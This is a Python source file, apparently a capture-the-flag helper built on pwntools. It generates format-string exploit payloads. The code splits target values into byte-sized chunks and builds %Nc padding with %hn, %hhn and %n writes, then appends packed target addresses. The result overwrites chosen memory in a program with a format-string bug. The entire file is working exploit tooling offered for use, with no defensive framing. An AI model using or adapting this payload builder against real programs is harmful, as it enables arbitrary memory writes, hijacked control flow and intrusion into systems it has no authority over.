from pwn import *

arch = 32


class Payload:
    def __init__(self, index,addon = ''):
        self.__index = index
        self.__payload = ''
        self.__chunk_list = []
        self.__addon = addon

    def add_write_chunk(self, value, address, write_len=int(arch/8),is_raw_length = False):
        if write_len != 2 and write_len != 1 and write_len != 4 and write_len != 8:
            raise ValueError
        if value < 0:
            raise ValueError
        if write_len == 1 or write_len == 2:
            if value >= (1 << (write_len*8)):
                raise ValueError
            write_chunk = FmtChunkW(value, address, write_len=write_len)
            self.__chunk_list.append(write_chunk)
        if write_len == 4:
            if value >= 0x100000000:
                raise ValueError
            if is_raw_length:
                write_chunk = FmtChunkW(value, address, write_len=write_len)
                self.__chunk_list.append(write_chunk)
            else:
                high = value >> 16
                low = value % 0x10000
                high_chunk = FmtChunkW(high, address+2)
                low_chunk = FmtChunkW(low, address)
                self.__chunk_list.append(high_chunk)
                self.__chunk_list.append(low_chunk)
        if write_len == 8:
            if value >= 0x10000000000000000:
                raise ValueError
            for i in range(4):
                write_value = (value >> (i*16)) % 0x10000
                write_address = address + i*2
                self.__chunk_list.append(FmtChunkW(write_value, write_address))
        return

    def get_payload(self):
        self.__chunk_list.sort(cmp=lambda chunk1, chunk2: int(chunk1) - int(chunk2))
        guess_length = len(self.__chunk_list) * 12   #  for most solutions
        guess_index = int(guess_length * 8 / arch) + 1
        while True:
            if guess_index < 0:
                exit(0)
            guess_string = self.gen_string(guess_index)
            if 'Z' * int(arch / 8) in guess_string:
                guess_index -= 1
            else:
                return guess_string

    def gen_string(self, start_index):
        last_value = 0
        format_string = ''
        address_string = ''
        for i in self.__chunk_list:
            tmp_format_string, tmp_address_string = \
                i.get_format(self.__index + start_index + self.__chunk_list.index(i), last_value)
            format_string += tmp_format_string
            address_string += tmp_address_string
            last_value = int(i)
        return format_string.ljust(start_index * int(arch / 8), 'Z') + self.__addon + address_string

class FmtChunkW:
    def __init__(self, value, address, write_len=2):
        self.__write_value = value
        self.__write_address = address
        self.__write_len = write_len

    def get_format(self, index, last_len):
        write_len = self.__write_value-last_len
        format_str = ''
        if write_len < 0:
            raise ValueError
        if write_len <= 4:
            format_str += 'a'*write_len
        else:
            format_str += '%' + str(write_len) + 'c'
        format_str += '%' + str(index) + '$'
        if self.__write_len != 2 and self.__write_len != 4 and self.__write_len != 1:
            raise ValueError
        if self.__write_len == 2:
            format_str += 'hn'
        if self.__write_len == 1:
            format_str += 'hhn'
        if self.__write_len == 4:
            format_str += 'n'
        return format_str, str(self)

    def __int__(self):
        return int(self.__write_value)

    def __str__(self):
        if arch == 64:
            return p64(self.__write_address)
        if arch == 32:
            return p32(self.__write_address)
        return None